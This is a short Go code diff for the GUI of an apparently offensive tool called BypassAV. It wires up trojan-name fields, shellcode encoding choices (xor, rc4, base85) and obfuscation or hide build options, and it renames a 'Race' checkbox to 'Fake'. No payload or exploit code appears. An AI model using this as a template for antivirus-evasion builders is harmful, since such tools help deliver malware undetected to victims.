@@ -28,7 +28,7 @@ var (
 		Upx:        false,
 		LiteralObf: false,
 		SeedRandom: false,
-		Race:       false,
+		Fake:       false,
 	}
 	TempOpt = core.Option{
 		Module:            "",
@@ -104,9 +104,6 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 	SelectFileV := container.NewBorder(nil, nil, BypassFileButton, nil, BypassFileEntry)
 	TrojanFileV := container.NewBorder(nil, nil, middle, nil, TrojanNameEntry)
 
-	BypassMixEntry := widget.NewEntry()
-	BypassMixEntry.SetPlaceHolder("Key")
-
 	shellcodeProcess := widget.NewSelect([]string{"xor+hex+base85", "xor+rc4+hex+base85", "rc4+hex+base85"}, func(s string) {
 		TempOpt.ShellcodeEncode = s
 	})
@@ -157,8 +154,8 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 	//buildLabel.Hide()
 
 	// 构建 build opt 多选框
-	buildCheck1 := widget.NewCheck("Race", func(b bool) {
-		TempOpt.BuildOpt.Race = b
+	buildCheck1 := widget.NewCheck("Fake", func(b bool) {
+		TempOpt.BuildOpt.Fake = b
 	})
 	buildCheck2 := widget.NewCheck("Hide", func(b bool) {
 		TempOpt.BuildOpt.Hide = b
